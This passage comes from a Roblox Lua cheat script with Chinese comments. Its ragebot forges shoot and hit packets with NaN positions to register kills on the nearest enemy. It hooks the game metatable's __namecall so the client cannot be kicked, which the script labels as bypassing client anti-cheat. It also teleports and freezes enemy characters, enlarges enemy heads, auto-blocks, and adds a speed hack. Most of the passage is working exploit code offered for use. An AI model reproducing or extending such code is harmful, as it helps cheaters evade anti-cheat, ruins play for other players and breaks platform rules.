        local packetsValue = bytenetStorage:FindFirstChild("packets")
        if not packetsValue then return nil end
        local idPackets = HttpService:JSONDecode(packetsValue.Value).packets
        local Ids = {}
        local PacketRef = require(ReplicatedStorage.REFERENCES.PacketReference)
        for name, id in pairs(idPackets) do
            Ids[id] = PacketRef[name]
        end
        return {shoot = Ids[80], hit = Ids[76]}
    end)
    if success and result then
        gunShoot = result.shoot
        gunHit = result.hit
    else
        -- 备用：尝试直接从PacketReference查找
        pcall(function()
            local PacketRef = require(ReplicatedStorage.REFERENCES.PacketReference)
            for name, packet in pairs(PacketRef) do
                local n = tostring(name):lower()
                if n:find("shoot") or n:find("fire") then gunShoot = packet end
                if n:find("hit") or n:find("damage") then gunHit = packet end
            end
        end)
    end
end
initRagePackets()

local function updateRageBotCache()
    rageBotCache = {}
    for _, v in ipairs(Workspace:GetDescendants()) do
        if v:IsA("Model") and v:FindFirstChildOfClass("Humanoid") and v:FindFirstChild("Head") then
            if not Players:GetPlayerFromCharacter(v) then
                local hum = v:FindFirstChildOfClass("Humanoid")
                local head = v:FindFirstChild("Head")
                if hum and hum.Health > 0 and head then
                    table.insert(rageBotCache, {head = head, char = v})
                end
            end
        end
    end
end

local function getRageClosestTarget()
    local char = localPlayer.Character
    if not char then return nil end
    local root = char:FindFirstChild("HumanoidRootPart")
    if not root then return nil end

    local now = os.clock()
    if lastRageTarget and now - rageTargetUpdateTime < 0.5 then
        local hum = lastRageTarget.char and lastRageTarget.char:FindFirstChildOfClass("Humanoid")
        if hum and hum.Health > 0 and lastRageTarget.head and lastRageTarget.head.Parent then
            return lastRageTarget
        end
    end

    if now - lastRageCacheUpdate > 3 then 
        pcall(updateRageBotCache)
        lastRageCacheUpdate = now 
    end

    local best, bestDist = nil, 99999
    local rootPos = root.Position

    local specificTargetName = _G.NEX_LC_VARS.rageSpecificTarget or ""
    local whitelistName = _G.NEX_LC_VARS.rageWhitelist or ""
    local wallCheck = _G.NEX_LC_VARS.rageWallCheck or false

    for _, p in ipairs(Players:GetPlayers()) do
        if p == localPlayer then continue end
        -- 修复：安全地检查队伍
        local isTeammate = false
        pcall(function()
            if p.Team and localPlayer.Team then
                isTeammate = (p.Team == localPlayer.Team)
            end
        end)
        if isTeammate then continue end

        if whitelistName ~= "" and p.Name == whitelistName then continue end
        if specificTargetName ~= "" and p.Name ~= specificTargetName then continue end

        local c = p.Character
        if c then
            local hum = c:FindFirstChildOfClass("Humanoid")
            local head = c:FindFirstChild("Head")
            if hum and hum.Health > 0 and head then
                local d = (rootPos - head.Position).Magnitude
                if wallCheck then
                    local params = RaycastParams.new()
                    params.FilterType = Enum.RaycastFilterType.Blacklist
                    params.FilterDescendantsInstances = {char, c}
                    local ray = Workspace:Raycast(rootPos, (head.Position - rootPos).Unit * d, params)
                    if ray then continue end
                end
                if d < bestDist then
                    bestDist = d
                    best = {head = head, char = c}
                end
            end
        end
    end

    if specificTargetName == "" then
        for _, bot in ipairs(rageBotCache) do
            if bot.head and bot.head.Parent and bot.char and bot.char.Parent then
                local d = (rootPos - bot.head.Position).Magnitude
                if wallCheck then
                    local params = RaycastParams.new()
                    params.FilterType = Enum.RaycastFilterType.Blacklist
                    params.FilterDescendantsInstances = {char, bot.char}
                    local ray = Workspace:Raycast(rootPos, (bot.head.Position - rootPos).Unit * d, params)
                    if ray then continue end
                end
                if d < bestDist then
                    bestDist = d
                    best = bot
                end
            end
        end
    end

    if best then 
        lastRageTarget = best
        rageTargetUpdateTime = now 
    end
    return best
end

local function doRagebot()
    if not _G.NEX_LC_VARS.ragebotEnabled then return end
    if not gunShoot or not gunHit then 
        -- 尝试重新初始化
        initRagePackets()
        if not gunShoot or not gunHit then return end
    end

    local char = localPlayer.Character
    if not char then return end
    local tool = char:FindFirstChildOfClass("Tool")
    if not tool or not char:FindFirstChild("HumanoidRootPart") then return end

    local now = os.clock()
    if now - _G.NEX_LC_VARS.lastRageShot < _G.NEX_LC_VARS.rageInterval then return end

    local target = getRageClosestTarget()
    if not target then return end

    _G.NEX_LC_VARS.lastRageShot = now

    -- 使用更安全的调用方式
    local shootSuccess = pcall(function()
        if gunShoot and gunShoot.send then
            gunShoot.send({
                Gun = tool,
                bulletOrigin = nanVec,
                bulletEnd = nanVec,
                rngSeed = NaN
            })
        end
    end)

    if shootSuccess then
        task.wait(0.05)
        pcall(function()
            if gunHit and gunHit.send then
                gunHit.send({
                    Gun = nil,
                    otherCharacter = target.char,
                    hitLimb = "",
                    hitTimestamp = NaN,
                    clientHitPosition = nanVec,
                    clientVictimPosition = nanVec
                })
            end
        end)
        rageKillCount = rageKillCount + 1
    end
end

function updateRagebotConnection()
    if _G.NEX_LC_VARS.ragebotEnabled then
        if not _G.NEX_LC_VARS.ragebotConn then
            pcall(updateRageBotCache)
            _G.NEX_LC_VARS.ragebotConn = RunService.Heartbeat:Connect(doRagebot)
            _G.NEX_LC_VARS.lastRageShot = os.clock() - _G.NEX_LC_VARS.rageInterval
        end
    else
        if _G.NEX_LC_VARS.ragebotConn then
            _G.NEX_LC_VARS.ragebotConn:Disconnect()
            _G.NEX_LC_VARS.ragebotConn = nil
        end
        lastRageTarget = nil
    end
end

localPlayer.CharacterAdded:Connect(function()
    if _G.NEX_LC_VARS.ragebotEnabled then
        _G.NEX_LC_VARS.lastRageShot = os.clock() - _G.NEX_LC_VARS.rageInterval
    end
end)

if localPlayer.Character then
    _G.NEX_LC_VARS.lastRageShot = os.clock() - _G.NEX_LC_VARS.rageInterval
end
_G.NEX_LC_VARS.bodyCenterTPEnabled = false
_G.NEX_LC_VARS.bodyCenterConn = nil

function bodyCenter()
    if not _G.NEX_LC_VARS.bodyCenterTPEnabled then return end
    local myChar = localPlayer.Character
    if not myChar then return end
    local target = findNearestEnemy()
    if not target or not target.Character or not target.Character:FindFirstChild("HumanoidRootPart") then return end
    local root = myChar:FindFirstChild("HumanoidRootPart")
    local tRoot = target.Character.HumanoidRootPart
    if not root then return end
    root.CFrame = tRoot.CFrame
    root.Velocity = Vector3.zero
    for _, part in ipairs(myChar:GetDescendants()) do
        if part:IsA("BasePart") then
            part.CanCollide = false
        end
    end
end

function updateBodyCenter()
    if _G.NEX_LC_VARS.bodyCenterTPEnabled then
        if not _G.NEX_LC_VARS.bodyCenterConn then
            _G.NEX_LC_VARS.bodyCenterConn = RunService.Heartbeat:Connect(bodyCenter)
        end
    else
        if _G.NEX_LC_VARS.bodyCenterConn then
            _G.NEX_LC_VARS.bodyCenterConn:Disconnect()
            _G.NEX_LC_VARS.bodyCenterConn = nil
        end
    end
end

_G.NEX_LC_VARS.autoMarkEnabled = false
_G.NEX_LC_VARS.autoMarkConn = nil
_G.NEX_LC_VARS.autoMarkLast = 0

function autoMark()
    if not _G.NEX_LC_VARS.autoMarkEnabled then return end
    if os.clock() - _G.NEX_LC_VARS.autoMarkLast < 1 then return end
    local char = localPlayer.Character
    if not char then return end
    local spyglass = char:FindFirstChild("Spyglass") or localPlayer.Backpack:FindFirstChild("Spyglass")
    if not spyglass then return end
    local root = char:FindFirstChild("HumanoidRootPart")
    if not root then return end
    local best, bestDist = nil, math.huge
    for _, p in ipairs(Players:GetPlayers()) do
        if p ~= localPlayer and isEnemy(p) and p.Character then
            local hum = p.Character:FindFirstChildOfClass("Humanoid")
            local r = p.Character:FindFirstChild("HumanoidRootPart")
            if hum and hum.Health > 0 and r then
                local d = (root.Position - r.Position).Magnitude
                if d < bestDist then
                    bestDist = d
                    best = p
                end
            end
        end
    end
    if best and best.Character then
        local success, packets = pcall(function() return require(ReplicatedStorage.REFERENCES.PacketReference) end)
        if success and packets and packets.PingEnemy then
            pcall(function() packets.PingEnemy.send({Enemy=best.Character, source="Spyglass", sourceTool=spyglass}) end)
        end
        _G.NEX_LC_VARS.autoMarkLast = os.clock()
    end
end

function updateAutoMark()
    if _G.NEX_LC_VARS.autoMarkEnabled then
        if not _G.NEX_LC_VARS.autoMarkConn then
            _G.NEX_LC_VARS.autoMarkConn = RunService.Heartbeat:Connect(autoMark)
        end
    else
        if _G.NEX_LC_VARS.autoMarkConn then
            _G.NEX_LC_VARS.autoMarkConn:Disconnect()
            _G.NEX_LC_VARS.autoMarkConn = nil
        end
    end
end

_G.NEX_LC_VARS.hookBypassEnabled = false
_G.NEX_LC_VARS.hookBypassConnections = {}
_G.NEX_LC_VARS._metatablePatched = false

function enableHookBypass()
    if not _G.NEX_LC_VARS.hookBypassEnabled then return end
    if _G.NEX_LC_VARS._metatablePatched then return end
    for _, conn in ipairs(_G.NEX_LC_VARS.hookBypassConnections) do
        pcall(function() conn:Disconnect() end)
    end
    _G.NEX_LC_VARS.hookBypassConnections = {}
    local mt = getrawmetatable(game)
    if mt then
        setreadonly(mt, false)
        local oldNamecall = mt.__namecall
        mt.__namecall = newcclosure(function(self, ...)
            local method = getnamecallmethod()
            if method == "Kick" and self == localPlayer then
                return
            end
            return oldNamecall(self, ...)
        end)
        setreadonly(mt, true)
        _G.NEX_LC_VARS._metatablePatched = true
    end
    local remConn = localPlayer.CharacterRemoving:Connect(function()
        localPlayer:LoadCharacter()
    end)
    table.insert(_G.NEX_LC_VARS.hookBypassConnections, remConn)
    WindUI:Notify({ Title = "绕过客户端反作弊", Content = "已开启", Duration = 2 })
end

function disableHookBypass()
    for _, conn in ipairs(_G.NEX_LC_VARS.hookBypassConnections) do
        pcall(function() conn:Disconnect() end)
    end
    _G.NEX_LC_VARS.hookBypassConnections = {}
    local mt = getrawmetatable(game)
    if mt and _G.NEX_LC_VARS._metatablePatched then
        setreadonly(mt, false)
        mt.__namecall = nil
        setreadonly(mt, true)
        _G.NEX_LC_VARS._metatablePatched = false
    end
    WindUI:Notify({ Title = "绕过客户端反作弊", Content = "已关闭", Duration = 2 })
end

function updateHookBypass()
    if _G.NEX_LC_VARS.hookBypassEnabled then
        enableHookBypass()
    else
        disableHookBypass()
    end
end

_G.NEX_LC_VARS.speedEnabled = false
_G.NEX_LC_VARS.currentSpeed = 16
_G.NEX_LC_VARS.speedConn = nil

function coordinateSpeed()
    if not _G.NEX_LC_VARS.speedEnabled then return end
    local hum = localPlayer.Character and localPlayer.Character:FindFirstChildOfClass("Humanoid")
    local root = localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart")
    if hum and root then
        local moveVector = hum.MoveDirection
        if moveVector.Magnitude > 0 then
            local newPos = root.Position + moveVector * _G.NEX_LC_VARS.currentSpeed * 0.016
            root.CFrame = CFrame.new(newPos) * root.CFrame.Rotation
        end
    end
end

function updateSpeed()
    if _G.NEX_LC_VARS.speedEnabled then
        if not _G.NEX_LC_VARS.speedConn then
            _G.NEX_LC_VARS.speedConn = RunService.Heartbeat:Connect(coordinateSpeed)
        end
        startBypass()
    else
        if _G.NEX_LC_VARS.speedConn then
            _G.NEX_LC_VARS.speedConn:Disconnect()
            _G.NEX_LC_VARS.speedConn = nil
        end
        local hum = localPlayer.Character and localPlayer.Character:FindFirstChildOfClass("Humanoid")
        if hum then hum.WalkSpeed = 16 end
        stopBypass()
    end
end

_G.NEX_LC_VARS.noSlowEnabled = false
_G.NEX_LC_VARS.noSlowConn = nil

function noSlowLoop()
    if not _G.NEX_LC_VARS.noSlowEnabled then return end
    local hum = localPlayer.Character and localPlayer.Character:FindFirstChildOfClass("Humanoid")
    if hum and hum.WalkSpeed < 16 then
        hum.WalkSpeed = 16
    end
end

function updateNoSlow()
    if _G.NEX_LC_VARS.noSlowEnabled then
        if not _G.NEX_LC_VARS.noSlowConn then
            _G.NEX_LC_VARS.noSlowConn = RunService.Heartbeat:Connect(noSlowLoop)
        end
    else
        if _G.NEX_LC_VARS.noSlowConn then
            _G.NEX_LC_VARS.noSlowConn:Disconnect()
            _G.NEX_LC_VARS.noSlowConn = nil
        end
    end
end

_G.NEX_LC_VARS.spinEnabled = false
_G.NEX_LC_VARS.spinSpeed = 0
_G.NEX_LC_VARS.spinConn = nil
_G.NEX_LC_VARS.spinAngle = 0

function spin(dt)
    if not _G.NEX_LC_VARS.spinEnabled or _G.NEX_LC_VARS.spinSpeed <= 0 then return end
    local root = localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart")
    local hum = localPlayer.Character and localPlayer.Character:FindFirstChildOfClass("Humanoid")
    if not root or not hum then return end
    hum.AutoRotate = false
    _G.NEX_LC_VARS.spinAngle = _G.NEX_LC_VARS.spinAngle + math.rad(_G.NEX_LC_VARS.spinSpeed * dt)
    local angle = _G.NEX_LC_VARS.spinAngle
    local lookVec = Camera.CFrame.LookVector
    local horizontalLook = Vector3.new(lookVec.X, 0, lookVec.Z).Unit
    if horizontalLook.Magnitude < 0.001 then horizontalLook = Vector3.new(1,0,0) end
    local rotCF = CFrame.new(root.Position, root.Position + horizontalLook) * CFrame.Angles(0, angle, 0)
    root.CFrame = CFrame.new(root.Position) * rotCF.Rotation
end

function updateSpin()
    if _G.NEX_LC_VARS.spinEnabled then
        if not _G.NEX_LC_VARS.spinConn then
            _G.NEX_LC_VARS.spinConn = RunService.Heartbeat:Connect(spin)
        end
    else
        if _G.NEX_LC_VARS.spinConn then
            _G.NEX_LC_VARS.spinConn:Disconnect()
            _G.NEX_LC_VARS.spinConn = nil
        end
        local hum = localPlayer.Character and localPlayer.Character:FindFirstChildOfClass("Humanoid")
        if hum then hum.AutoRotate = true end
        _G.NEX_LC_VARS.spinAngle = 0
    end
end

_G.NEX_LC_VARS.perfMode = false
originalLighting = {}

function setPerfMode(enabled)
    if enabled then
        if not originalLighting.GlobalShadows then
            originalLighting.GlobalShadows = game.Lighting.GlobalShadows
            originalLighting.FogEnd = game.Lighting.FogEnd
            originalLighting.FogStart = game.Lighting.FogStart
            originalLighting.Technology = game.Lighting.Technology
        end
        game.Lighting.GlobalShadows = false
        game.Lighting.FogEnd = 1e9
        game.Lighting.FogStart = 1e9
        game.Lighting.Technology = Enum.LightingTechnology.Compatibility
        for _, effect in ipairs(game.Lighting:GetChildren()) do
            if effect:IsA("BloomEffect") or effect:IsA("ColorCorrectionEffect") or effect:IsA("SunRaysEffect") or effect:IsA("DepthOfFieldEffect") then
                pcall(function() effect.Enabled = false end)
            end
        end
        pcall(function() settings().Rendering.QualityLevel = 1 end)
        WindUI:Notify({ Title = "性能模式", Content = "已开启", Duration = 2 })
    else
        game.Lighting.GlobalShadows = originalLighting.GlobalShadows or true
        game.Lighting.FogEnd = originalLighting.FogEnd or 100000
        game.Lighting.FogStart = originalLighting.FogStart or 0
        game.Lighting.Technology = originalLighting.Technology or Enum.LightingTechnology.ShadowMap
        pcall(function() settings().Rendering.QualityLevel = 10 end)
        WindUI:Notify({ Title = "性能模式", Content = "已关闭", Duration = 2 })
    end
end

_G.NEX_LC_VARS.ultraFOVEnabled = false
_G.NEX_LC_VARS.fovValue = 120
_G.NEX_LC_VARS.fovConn = nil

function startUltraFOV()
    if _G.NEX_LC_VARS.fovConn then _G.NEX_LC_VARS.fovConn:Disconnect() end
    _G.NEX_LC_VARS.fovConn = RunService.RenderStepped:Connect(function()
        if not _G.NEX_LC_VARS.ultraFOVEnabled then return end
        workspace.CurrentCamera.FieldOfView = _G.NEX_LC_VARS.fovValue
    end)
end

function stopUltraFOV()
    if _G.NEX_LC_VARS.fovConn then
        _G.NEX_LC_VARS.fovConn:Disconnect()
        _G.NEX_LC_VARS.fovConn = nil
    end
    workspace.CurrentCamera.FieldOfView = 70
end

function updateUltraFOV()
    if _G.NEX_LC_VARS.ultraFOVEnabled then
        startUltraFOV()
    else
        stopUltraFOV()
    end
end

_G.NEX_LC_VARS.bringAllEnabled = false
_G.NEX_LC_VARS.bringAllConn = nil

function freezeCharacter(character)
    local humanoid = character:FindFirstChild("Humanoid")
    if humanoid then
        humanoid.PlatformStand = true
    end
    local rootPart = character:FindFirstChild("HumanoidRootPart")
    if rootPart then
        rootPart.Velocity = Vector3.new(0,0,0)
        rootPart.RotVelocity = Vector3.new(0,0,0)
    end
end

function unfreezeCharacter(character)
    local humanoid = character:FindFirstChild("Humanoid")
    if humanoid then
        humanoid.PlatformStand = false
    end
end

function teleportToMe(targetCharacter)
    local myChar = localPlayer.Character
    if not myChar then return end
    local myRoot = myChar:FindFirstChild("HumanoidRootPart")
    local targetRoot = targetCharacter:FindFirstChild("HumanoidRootPart")
    if not myRoot or not targetRoot then return end
    local frontPos = myRoot.Position + myRoot.CFrame.LookVector * 3
    frontPos = Vector3.new(frontPos.X, myRoot.Position.Y, frontPos.Z)
    targetRoot.CFrame = CFrame.new(frontPos)
    targetRoot.Velocity = Vector3.new(0,0,0)
    targetRoot.RotVelocity = Vector3.new(0,0,0)
end

function bringAllLoop()
    if not _G.NEX_LC_VARS.bringAllEnabled then return end
    local myChar = localPlayer.Character
    if not myChar then return end
    for _, player in ipairs(Players:GetPlayers()) do
        if player ~= localPlayer and isEnemy(player) then
            local character = player.Character
            if character and character.Parent then
                teleportToMe(character)
                freezeCharacter(character)
            end
        end
    end
end

function updateBringAll()
    if _G.NEX_LC_VARS.bringAllEnabled then
        if not _G.NEX_LC_VARS.bringAllConn then
            _G.NEX_LC_VARS.bringAllConn = RunService.Heartbeat:Connect(bringAllLoop)
        end
    else
        if _G.NEX_LC_VARS.bringAllConn then
            _G.NEX_LC_VARS.bringAllConn:Disconnect()
            _G.NEX_LC_VARS.bringAllConn = nil
        end
        for _, player in ipairs(Players:GetPlayers()) do
            if player ~= localPlayer then
                local char = player.Character
                if char then
                    unfreezeCharacter(char)
                end
            end
        end
        local myChar = localPlayer.Character
        if myChar then
            local hum = myChar:FindFirstChildOfClass("Humanoid")
            if hum then
                hum.PlatformStand = false
                hum.WalkSpeed = 16
            end
        end
    end
end

_G.NEX_LC_VARS.jumpButtonEnabled = false
_G.NEX_LC_VARS.jumpGui = nil

function createJumpButton()
    if _G.NEX_LC_VARS.jumpGui then
        _G.NEX_LC_VARS.jumpGui:Destroy()
        _G.NEX_LC_VARS.jumpGui = nil
    end
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "JumpButtonGUI"
    screenGui.ResetOnSpawn = false
    screenGui.Parent = localPlayer:WaitForChild("PlayerGui")
    local jumpBtn = Instance.new("TextButton")
    jumpBtn.Size = UDim2.new(0, 72, 0, 36)
    jumpBtn.Position = UDim2.new(1, -87, 1, -65)
    jumpBtn.Text = "跳跃"
    jumpBtn.TextSize = 20
    jumpBtn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    jumpBtn.BackgroundTransparency = 0.5
    jumpBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    jumpBtn.Font = Enum.Font.SourceSansBold
    jumpBtn.BorderSizePixel = 0
    jumpBtn.Active = true
    jumpBtn.Parent = screenGui
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 8)
    corner.Parent = jumpBtn
    local dragging = false
    local dragInput = nil
    local dragStart = nil
    local startPos = nil
    local function updateDrag(input)
        local delta = input.Position - dragStart
        jumpBtn.Position = UDim2.new(
            startPos.X.Scale,
            startPos.X.Offset + delta.X,
            startPos.Y.Scale,
            startPos.Y.Offset + delta.Y
        )
    end
    jumpBtn.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            dragStart = input.Position
            startPos = jumpBtn.Position
            input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then
                    dragging = false
                end
            end)
        end
    end)
    jumpBtn.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
            dragInput = input
        end
    end)
    UserInputService.InputChanged:Connect(function(input)
        if dragging and input == dragInput and dragStart and startPos then
            updateDrag(input)
        end
    end)
    jumpBtn.MouseButton1Click:Connect(function()
        local char = localPlayer.Character
        if not char then return end
        local hum = char:FindFirstChildOfClass("Humanoid")
        local rootPart = char:FindFirstChild("HumanoidRootPart") or char.PrimaryPart
        if not hum or hum.Health <= 0 or not rootPart or not rootPart:IsA("BasePart") then return end
        pcall(function()
            local mass = rootPart.AssemblyMass
            local impulse = Vector3.new(0, mass * 35, 0)
            rootPart:ApplyImpulse(impulse)
            local vel = rootPart.AssemblyLinearVelocity
            if vel.Y < 6 then
                rootPart.AssemblyLinearVelocity = Vector3.new(vel.X, math.max(vel.Y, 0) + 6, vel.Z)
            end
        end)
    end)
    _G.NEX_LC_VARS.jumpGui = screenGui
end

function updateJumpButton()
    if _G.NEX_LC_VARS.jumpButtonEnabled then
        createJumpButton()
    else
        if _G.NEX_LC_VARS.jumpGui then
            _G.NEX_LC_VARS.jumpGui:Destroy()
            _G.NEX_LC_VARS.jumpGui = nil
        end
    end
end

_G.NEX_LC_VARS.autoPickupEnabled = false
_G.NEX_LC_VARS.autoPickupConn = nil
function doAutoPickup() end
function updateAutoPickup() end

_G.NEX_LC_VARS.autoFaceEnemyEnabled = false
_G.NEX_LC_VARS.autoFaceEnemyConn = nil
function doAutoFaceEnemy() end
function updateAutoFaceEnemy() end

_G.NEX_LC_VARS.bigHeadEnabled = false
_G.NEX_LC_VARS.bigHeadConnections = {}

function enlargeHeads()
    for _, p in ipairs(Players:GetPlayers()) do
        if p ~= localPlayer and isEnemy(p) then
            local c = p.Character
            if c then
                local head = c:FindFirstChild("Head")
                if head then head.Size = Vector3.new(6,6,6) end
            end
        end
    end
end

function startBigHead()
    enlargeHeads()
    for _, p in ipairs(Players:GetPlayers()) do
        if p ~= localPlayer then
            local conn = p.CharacterAdded:Connect(function()
                if _G.NEX_LC_VARS.bigHeadEnabled then
                    task.wait(0.5)
                    local c = p.Character
                    if c and isEnemy(p) then
                        local head = c:FindFirstChild("Head")
                        if head then head.Size = Vector3.new(6,6,6) end
                    end
                end
            end)
            table.insert(_G.NEX_LC_VARS.bigHeadConnections, conn)
        end
    end
end

function updateBigHead()
    if _G.NEX_LC_VARS.bigHeadEnabled then
        startBigHead()
    else
        for _, conn in ipairs(_G.NEX_LC_VARS.bigHeadConnections) do
            pcall(function() conn:Disconnect() end)
        end
        _G.NEX_LC_VARS.bigHeadConnections = {}
        for _, p in ipairs(Players:GetPlayers()) do
            if p ~= localPlayer then
                local c = p.Character
                if c then
                    local head = c:FindFirstChild("Head")
                    if head then head.Size = Vector3.new(2,2,2) end
                end
            end
        end
    end
end

_G.NEX_LC_VARS.autoBlockEnabled = false
_G.NEX_LC_VARS.autoBlockConn = nil
_G.NEX_LC_VARS.autoBlockLast = 0
_G.NEX_LC_VARS.cachedPackets = nil

function startAutoBlock()
    if _G.NEX_LC_VARS.autoBlockConn then _G.NEX_LC_VARS.autoBlockConn:Disconnect() end
    _G.NEX_LC_VARS.cachedPackets = pcall(require, ReplicatedStorage.REFERENCES.PacketReference) and require(ReplicatedStorage.REFERENCES.PacketReference)
    _G.NEX_LC_VARS.autoBlockConn = RunService.Heartbeat:Connect(function()
        if not _G.NEX_LC_VARS.autoBlockEnabled then return end
        local char = localPlayer.Character
        if not char then return end
        local tool = char:FindFirstChildOfClass("Tool")
        if not tool then return end
        local now = os.clock()
        if now - _G.NEX_LC_VARS.autoBlockLast < 0.1 then return end
        _G.NEX_LC_VARS.autoBlockLast = now
        if _G.NEX_LC_VARS.cachedPackets and _G.NEX_LC_VARS.cachedPackets.ReplicateSwordBlock then
            pcall(function()
                _G.NEX_LC_VARS.cachedPackets.ReplicateSwordBlock.send({Tool = tool, isBlocking = true})
            end)
        end
        local hum = char:FindFirstChildOfClass("Humanoid")
        if hum and hum.WalkSpeed < 16 then hum.WalkSpeed = 16 end
    end)
end

function updateAutoBlock()
    if _G.NEX_LC_VARS.autoBlockEnabled then
        startAutoBlock()
    else
        if _G.NEX_LC_VARS.autoBlockConn then
            _G.NEX_LC_VARS.autoBlockConn:Disconnect()
            _G.NEX_LC_VARS.autoBlockConn = nil
        end
    end
end

_G.NEX_LC_VARS.homelandLaserEnabled = false
_G.NEX_LC_VARS.homelandConn = nil
_G.NEX_LC_VARS.homelandBeamFolder = nil
_G.NEX_LC_VARS.homelandLastHighlight = 0

local function createLaser(from, to, color)
    if not _G.NEX_LC_VARS.homelandBeamFolder then
        _G.NEX_LC_VARS.homelandBeamFolder = Instance.new("Folder", Workspace)
        _G.NEX_LC_VARS.homelandBeamFolder.Name = "HomelanderLasers"
    end
    local beam = Instance.new("Beam", _G.NEX_LC_VARS.homelandBeamFolder)
    beam.Width0 = 2
    beam.Width1 = 2
    beam.Color = ColorSequence.new(color)
    beam.Transparency = NumberSequence.new(0.1)
    beam.FaceCamera = true
    beam.Texture = "rbxassetid://446111271"
    beam.TextureMode = Enum.TextureMode.Wrap
    beam.TextureLength = 1
    beam.LightEmission = 1
    beam.LightInfluence = 1
    local att0 = Instance.new("Attachment", _G.NEX_LC_VARS.homelandBeamFolder)
    att0.WorldPosition = from
    local att1 = Instance.new("Attachment", _G.NEX_LC_VARS.homelandBeamFolder)
    att1.WorldPosition = to
    beam.Attachment0 = att0
    beam.Attachment1 = att1
    task.delay(0.08, function()
        pcall(function()
            beam:Destroy()
            att0:Destroy()
            att1:Destroy()
        end)
    end)
end

local function homelandHighlightEnemy(target)
    local now = os.clock()
    if now - _G.NEX_LC_VARS.homelandLastHighlight < 0.5 then return end
    _G.NEX_LC_VARS.homelandLastHighlight = now
    local packets = pcall(require, ReplicatedStorage.REFERENCES.PacketReference) and require(ReplicatedStorage.REFERENCES.PacketReference)
    if packets and packets.ReplicateHighlightClone then
        pcall(function()
            packets.ReplicateHighlightClone.send({
                Character = target.Character,
                Color = Color3.fromRGB(255, 50, 50),
                FillTransparency = 0.4,
                OutlineTransparency = 0,
                Duration = 0.5
            })
        end)
    end
end

local function homelandBotCache()
    local bots = {}
    for _, v in ipairs(Workspace:GetDescendants()) do
        if v:IsA("Model") and v:FindFirstChildOfClass("Humanoid") and v:FindFirstChild("Head") then
            if not Players:GetPlayerFromCharacter(v) then
                local hum = v:FindFirstChildOfClass("Humanoid")
                local head = v:FindFirstChild("Head")
                if hum and hum.Health > 0 and head then
                    table.insert(bots, {Character = v, Head = head})
                end
            end
        end
    end
    return bots
end

local function getClosestTargetForLaser()
    local char = localPlayer.Character
    if not char then return nil end
    local myHead = char:FindFirstChild("Head")
    if not myHead then return nil end
    local best, bestDist = nil, 100
    for _, p in ipairs(Players:GetPlayers()) do
        if p ~= localPlayer and isEnemy(p) and p.Character then
            local eHead = p.Character:FindFirstChild("Head")
            if eHead then
                local d = (myHead.Position - eHead.Position).Magnitude
                if d < bestDist then
                    bestDist = d
                    best = {Character = p.Character, Head = eHead}
                end
            end
        end
    end
    for _, bot in ipairs(homelandBotCache()) do
        if bot.Head and bot.Head.Parent then
            local d = (myHead.Position - bot.Head.Position).Magnitude
            if d < bestDist then
                bestDist = d
                best = bot
            end
        end
    end
    return best
end

local function homelandLaserLoop()
    if not _G.NEX_LC_VARS.homelandLaserEnabled then return end
    local char = localPlayer.Character
    if not char then return end
    local head = char:FindFirstChild("Head")
    if not head then return end
    local leftEye = head.Position + head.CFrame.RightVector * 0.3 + head.CFrame.UpVector * 0.3
    local rightEye = head.Position - head.CFrame.RightVector * 0.3 + head.CFrame.UpVector * 0.3
    local target = getClosestTargetForLaser()
    if target and target.Head then
        createLaser(leftEye, target.Head.Position, Color3.fromRGB(255, 30, 30))
        createLaser(rightEye, target.Head.Position, Color3.fromRGB(255, 80, 50))
        createLaser(leftEye + Vector3.new(0, 0.1, 0), target.Head.Position, Color3.fromRGB(255, 100, 80))
        createLaser(rightEye + Vector3.new(0, -0.1, 0), target.Head.Position, Color3.fromRGB(255, 150, 100))
        homelandHighlightEnemy(target)
    else
        local forward = head.CFrame.LookVector * 30
        createLaser(leftEye, leftEye + forward, Color3.fromRGB(255, 30, 30))
        createLaser(rightEye, rightEye + forward, Color3.fromRGB(255, 80, 50))
    end
end

function startHomelandLaser()
    if _G.NEX_LC_VARS.homelandConn then _G.NEX_LC_VARS.homelandConn:Disconnect() end
    _G.NEX_LC_VARS.homelandLaserEnabled = true
    _G.NEX_LC_VARS.homelandConn = RunService.RenderStepped:Connect(homelandLaserLoop)
end

function stopHomelandLaser()
    _G.NEX_LC_VARS.homelandLaserEnabled = false
    if _G.NEX_LC_VARS.homelandConn then
        _G.NEX_LC_VARS.homelandConn:Disconnect()
        _G.NEX_LC_VARS.homelandConn = nil
    end
    if _G.NEX_LC_VARS.homelandBeamFolder then
        _G.NEX_LC_VARS.homelandBeamFolder:Destroy()
        _G.NEX_LC_VARS.homelandBeamFolder = nil
    end
end

-- ============================================
-- 幽灵模式额外UI (修复版 - 支持拖动)
-- ============================================
local ghostExtraUI = nil

local function createGhostExtraUI()
    if ghostExtraUI then 
        pcall(function() ghostExtraUI.Gui.Enabled = true end)
        return 
    end
    local gui = Instance.new("ScreenGui", CoreGui)
    gui.Name = "GhostExtraUI"
    gui.ResetOnSpawn = false
    gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    gui.DisplayOrder = 99999

    local frame = Instance.new("Frame", gui)
    frame.Size = UDim2.new(0, 130, 0, 80)
    frame.Position = UDim2.new(0, 15, 0.35, 0)
    frame.BackgroundColor3 = Color3.fromRGB(25, 20, 35)
    frame.BackgroundTransparency = 0.45
    frame.BorderSizePixel = 0
    frame.Active = true

    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 6)
    corner.Parent = frame

    local stroke = Instance.new("UIStroke")
    stroke.Color = Color3.fromRGB(150, 100, 255)
    stroke.Thickness = 1.5
    stroke.Transparency = 0.5
    stroke.Parent = frame

    local title = Instance.new("TextLabel", frame)
    title.Size = UDim2.new(1, -24, 0, 18)
    title.Position = UDim2.new(0, 6, 0, 2)
    title.BackgroundTransparency = 1
    title.Text = "👻 幽灵模式"
    title.TextColor3 = Color3.fromRGB(220, 180, 255)
